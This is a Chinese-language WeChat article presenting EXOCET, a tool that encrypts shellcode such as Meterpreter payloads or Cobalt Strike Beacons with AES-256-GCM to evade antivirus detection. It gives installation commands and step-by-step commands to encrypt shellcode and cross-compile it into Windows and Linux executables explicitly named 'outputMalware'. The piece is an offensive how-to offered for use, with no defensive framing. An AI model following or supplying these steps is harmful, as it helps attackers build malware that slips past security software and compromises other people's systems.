---
title: 神兵利器 – EXOCET
url: https://mp.weixin.qq.com/s/aeX4SGA0_2dnMDHngaSHIQ
source: Doonsec's feed
date: 2026-10-04
fetch_date: 2026-10-05T07:55:45.806706
---

# 神兵利器 – EXOCET

# 神兵利器 – EXOCET

黑白之道

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

# 关于![图片](https://mmbiz.qpic.cn/mmbiz_gif/1N1JeeKBorfNC0DOY6v06JXpicTf21LuKN0Ep4oBJK8b5W8CBqS4uUQxtPUa9PZ2XwDQMvtcZ5XdrwE2xrztKGrWN1E5XsYYmFHAtxFoeml8/640?wx_fmt=gif&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=1)

EXOCET 基于 Metasploit 的Evasive Payloads模块，因为 EXOCET 在 GCM模式（Galois/Counter 模式）下使用 AES-256。Metasploit 的 Evasion Payloads 使用易于检测的 RC4 加密。虽然 RC4 可以更快地解密，但 AES-256 很难确定恶意软件的意图。

# ![图片](https://mmbiz.qpic.cn/mmbiz_gif/1N1JeeKBorfNSibqiaChLc0F0g3xibVpg5sFPn8a7lNNlJxQOnFb9zoiaX6RgSWpXByEZIeCNgreBXvw9MISBfPvXqHsWaiam1sQ9vAcicNdtzVG0/640?wx_fmt=gif&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=2)安装![图片](https://mmbiz.qpic.cn/mmbiz_gif/1N1JeeKBorfdqibV03GHbZGvanpjSGKX1bjHYHkggF4YmUPc2alJt5SlOhu5ZIFOabJrQWzTs5y7KXeVmqpyPZXn4HVge3UEB5d3kOSVzbTw/640?wx_fmt=gif&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=3)

首先，我们需要在Linux环境中安装`Go`开发环境。

```
sudo apt-get update && sudo apt-get install -y golang
```

接着，克隆项目文件

```
git clone github.com/tanc7/EXOCET-AV-Evasion
```

使用
第一步:生成 shellcode，这可以来自 msfvenom Meterpreter 有效载荷、Cobalt Strike Beacons 或您自己的 C 兼容格式的自定义 shellcode

![图片](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathu48SJxKm4cYpr5nfjn8049JF2LI6gHnOeTdXYNcNHWA6FOkh9DZbg0OPwImAEJYBRRL0znoWXpQ/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=4)

第 二步：仅将 shellcode 代码复制到像 kali.txt这样的文本文件中，不包括引号接着，根据系统类型。进行生成相关shell

```
go run exocet-shellcode-exec.go kali.txt shellcodetest.go KEY
```

**对于 64 位 Windows 目标**

```
env GOOS=windows GOARCH=amd64 go build -ldflags "-s -w"-o outputMalware.exe outputmalware.go
```

然后出现一个文件outputmalware.exe

**对于 64 位 Linux 目标**

```
env GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" -o outputMalware.elf outputmalware.go
```

效果

![图片](https://mmbiz.qpic.cn/mmbiz_png/Xb3L3wnAiathu48SJxKm4cYpr5nfjn804BUynbw38BOtMjqicvY9974H828ibg0YNx9ePhPuRnD0tNiaC5rCcQ44PA/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=5)

文章来源：kali笔记

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/3xxicXNlTXLicpdp8GZxicJpcFIZglvakzYRZiaqt6W61hfgibjeymOgiaGqRsgNvgWIacMj7Gk4PIZ4o2NtW1zb9P6Q/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过